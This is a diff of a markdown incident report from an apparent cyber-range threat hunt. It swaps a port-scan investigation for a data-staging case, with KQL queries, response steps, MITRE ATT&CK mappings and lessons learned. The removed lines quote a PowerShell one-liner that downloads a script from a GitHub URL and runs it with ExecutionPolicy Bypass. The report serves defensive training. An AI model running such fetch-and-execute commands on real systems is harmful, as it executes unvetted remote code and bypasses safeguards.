@@ -102,65 +102,43 @@ powershell.exe -ExecutionPolicy Bypass -Command "...Install 7zip..."
 
 ## 5. Investigation
 
-Pivoted to DeviceProcessEvents for host windows-target-1 and timestamp near suspicious activity:
+- Queried for any signs of exfiltration:
 
 ```kql
-let VMName = "windows-target-1";
-let specificTime = datetime(2025-06-10T08:41:10.2458249Z);
-DeviceProcessEvents
-| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
+let VMName = "vmlab-fe";
+let specificTime = datetime(2025-06-21T04:53:44.4622833Z);
+DeviceNetworkEvents
+| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
 | where DeviceName == VMName
-| where InitiatingProcessCommandLine contains "portscan"
 | order by Timestamp desc
-| project Timestamp, FileName, InitiatingProcessCommandLine, AccountName
+| project Timestamp, DeviceName, ActionType
 
 ```
-![DeviceProcessEvents](https://github.com/user-attachments/assets/42402a97-5812-4ae5-9230-e88689618cbc)
 
-Account:
-Executed by SYSTEM — not expected behavior; not triggered by any admin.
+![DataCollection5-1](https://github.com/user-attachments/assets/87993368-76c8-4c55-9742-05ca40ecbb5a)
 
 Key Finding:
-A PowerShell command was executed at 2025-06-10T08:37:51Z with the following line:
+No evidence of network-based exfiltration was detected during this timeframe.
 
-```powershell
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
-
-```
-
-I logged into the suspect computer and observed the powershell script that was used to conduct the port scan:
-
-![portscan](https://github.com/user-attachments/assets/ba71f03c-5e53-4fab-bf31-743708f8d6d2)
 
 
 ## 6. Response
 ### Actions Taken:
 
-- Logged into the device to verify script existence. 
-- Confirmed the file portscan.ps1 existed under C:\ProgramData. 
-- Isolated the host from the network. 
-- Performed a full malware scan (no malware detected). 
-- Escalated to IT for reimaging of the device to ensure integrity. 
+- The device vmlab-fe was immediately isolated from the network to prevent potential exfiltration or lateral movement.
+- Full details were relayed to the employee's manager and internal HR/security teams.
+- Awaiting next steps for HR or legal involvement.
 
 ## 7. MITRE ATT&CK Mapping
 
-- T1046 - Network Service Discovery  
-  (Port scanning activity to identify open services)
+- T1059.001 – Command and Scripting Interpreter: PowerShell  
+- T1560.001 – Archive Collected Data: Archive via Utility  
+- T1005 – Data from Local System  
+- T1074.001 – Local Data Staging  
+- T1204.002 – User Execution: Malicious File (Potential)  
+- T1083 – File and Directory Discovery (Inferred)  
+- T1036 – Masquerading (Potential)
 
-- T1059.001 - Command and Scripting Interpreter: PowerShell  
-  (Execution of PowerShell script to perform scan)
-
-- T1078 - Valid Accounts  
-  (Script executed under SYSTEM account)
-
-- T1105 - Ingress Tool Transfer  
-  (Script downloaded from external URL using Invoke-WebRequest)
-
-- T1204.002 - User Execution: Malicious File  
-  (Execution of suspicious PowerShell file)
-
-- T1562.001 - Impair Defenses (if applicable)  
-  (Not confirmed, but would apply if local defenses were bypassed or modified)
 
 ## 8. Lessons Learned / Improvement: 
 
@@ -172,9 +150,31 @@ Threat Contained: ✅
 
 Device Isolated: ✅
 
-Malware Scan Result: Clean
+✅ What We Did Well:
+Time-based pivoting effectively correlated file, process, and network activity.
 
-Device Action: Ticket submitted for full rebuild
+Rapid isolation of the host prevented possible data loss.
+
+Used threat-informed hypothesis to guide focused hunting.
+
+🛠️ What Could Be Improved:
+Proactive Controls:
+
+Implement application control to block unauthorized installers like 7-Zip.
+
+Restrict PowerShell use via Group Policy or WDAC.
+
+Enable PowerShell logging for better audit trails.
+
+Enhanced Detection:
+
+Develop detection rules for archive tool usage and scripting patterns.
+
+Monitor .zip file creation in unusual folders or by non-standard processes.
+
+Automation:
+
+Build KQL automation to alert when archiving tools and data directories interact.
 
 
 
